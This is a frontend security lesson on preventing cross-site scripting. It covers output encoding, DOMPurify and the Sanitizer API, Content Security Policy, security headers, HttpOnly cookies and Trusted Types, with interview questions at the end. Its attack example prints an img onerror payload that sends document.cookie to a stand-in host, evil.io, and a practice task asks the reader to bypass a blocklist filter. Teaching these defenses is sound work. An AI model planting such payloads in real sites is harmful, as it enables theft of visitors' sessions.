Security: XSS, CSP, Sanitization Ultra-Advanced

Cross-site scripting has been in the OWASP Top 10 for over twenty years because the mistake is so natural: taking text a user gave you and letting the browser interpret it as HTML. One vulnerable comment box = attacker JavaScript running in every visitor's session — reading their data, performing actions as them, stealing tokens. This lesson is the layered defense production frontends actually ship.

The Three Flavors of XSS

Anatomy of an Attack

// A "comment" someone submitted:
<img src=x onerror="fetch('https://evil.io/steal?c='+document.cookie)">

// Your rendering code:
commentDiv.innerHTML = comment.text;     // 💥 image fails to load → onerror runs
                                          // → every visitor's cookies exfiltrated

Notice: no <script> tag needed. Event handlers (onerror, onload, onfocus…), javascript: URLs, and even CSS url() in style attributes are all execution vectors — which is why blocklist filtering ("just strip <script>") always loses.

Layer 1 — Escape by Default (output encoding)

commentDiv.textContent = comment.text;        // ✅ always literal text — the default choice
// Frameworks made this the default: React {expr}, Vue {{ }}, Angular {{ }} all auto-escape.
// Their escape hatches are named to scare you: dangerouslySetInnerHTML,
// v-html, bypassSecurityTrustHtml — every use is a code-review event.

Rule: encode for the context — HTML body, attribute value, URL, and JS-string contexts each have different escaping rules; template engines handle this when you stay on the paved path.

Layer 2 — Sanitize When You MUST Render Rich HTML

// User-authored rich text (markdown editors, CMS content):
import DOMPurify from "dompurify";
div.innerHTML = DOMPurify.sanitize(userHtml, { ALLOWED_TAGS: ["b","i","a","p","ul","li"] });

// The platform is standardizing this: the Sanitizer API
div.setHTML(userHtml);                        // sanitizes by spec, where supported

Never hand-roll a sanitizer — parser edge cases (mutation XSS, mXSS) defeat naive filters. And sanitize URLs separately: allow only http/https/mailto schemes on user-supplied hrefs; javascript:alert(1) executes on click.

Layer 3 — Content Security Policy (the blast shield)

Content-Security-Policy:
  default-src 'self';                          ← nothing loads from anywhere else…
  script-src 'self' https://js.stripe.com;     ← …scripts only from us + Stripe
  img-src 'self' data: https:;
  style-src 'self' 'unsafe-inline';            ← inline styles: often needed, known cost
  object-src 'none'; base-uri 'none';          ← kill legacy vectors (<base> hijack!)
  frame-ancestors 'none';                      ← nobody may iframe us → clickjacking dead
  report-to csp-endpoint;                      ← violations reported to telemetry

The Companion Headers (ship the full set)

X-Content-Type-Options: nosniff          stops MIME-sniffing a .txt upload into HTML
Referrer-Policy: strict-origin-when-cross-origin      URLs (with tokens) stop leaking
Strict-Transport-Security: max-age=63072000; includeSubDomains    HTTPS forever
Cross-Origin-Opener-Policy: same-origin  isolates your window from cross-origin openers
Set-Cookie: session=…; HttpOnly; Secure; SameSite=Lax
            └─ JS can't read it ─ HTTPS only ─ CSRF largely neutralized

HttpOnly is the underrated hero: even a successful XSS cannot read the session cookie. (It can still act as the user while the tab is open — XSS is never "fine" — but token theft is off the table.)

The Endgame: Trusted Types

Content-Security-Policy: require-trusted-types-for 'script'; trusted-types app-policy;
// Now el.innerHTML = string THROWS unless the value came through a registered policy:
const policy = trustedTypes.createPolicy("app-policy", { createHTML: s => DOMPurify.sanitize(s) });
el.innerHTML = policy.createHTML(userHtml);   // the ONLY door, and it sanitizes

Trusted Types turns "did every engineer remember to sanitize?" into a browser-enforced guarantee — DOM XSS becomes a compile-time-style error. Google runs this across Gmail/Docs/Maps; mentioning it in an interview is an instant seniority signal.

Interview Questions

Q1: textContent vs innerHTML vs sanitize — decision tree?

Plain text (names, comments without formatting) → textContent, always. User-authored rich content → sanitize (DOMPurify/Sanitizer API) then innerHTML. Your own trusted template strings → innerHTML is acceptable but framework templates are better. Never: raw user input into innerHTML/outerHTML/ insertAdjacentHTML/document.write.

Q2: How does CSP stop XSS if the payload is already in the page?

Injection ≠ execution. With no 'unsafe-inline' (or with nonces), the browser refuses inline script/event-handler execution; script-src allowlists block loading attacker JS; connect/img-src block exfiltration channels. The payload sits inert in the DOM and a violation report fires.

Q3: Where do auth tokens belong and why?

HttpOnly+Secure+SameSite cookies: invisible to JS (XSS can't steal them), not sent cross-site (CSRF mitigated), transported automatically. localStorage tokens are readable by ANY script that achieves execution — one XSS = full account takeover, plus they leak into backups/extensions.

🏋️ Practice (all in the sandboxed Playground):
1. Render <img src=x onerror="alert('xss')"> via innerHTML and watch it fire; switch to textContent and watch it become harmless text.
2. Write a naive blocklist filter that strips "<script>" and defeat it three different ways (onerror, svg/onload, nested tags).
3. Draft the CSP header for an app using self-hosted assets + Stripe JS + Google Fonts, in report-only form first.

🎯 Key Takeaways

  • XSS = user text interpreted as markup; stored/reflected/DOM variants, all one root cause.
  • Layered defense: escape by default → sanitize rich text → CSP with nonces → Trusted Types.
  • Blocklists always lose; context-aware encoding and real sanitizers win.
  • Session tokens live in HttpOnly cookies; localStorage is XSS-readable.
  • Roll out CSP report-only first; treat every violation report as telemetry gold.
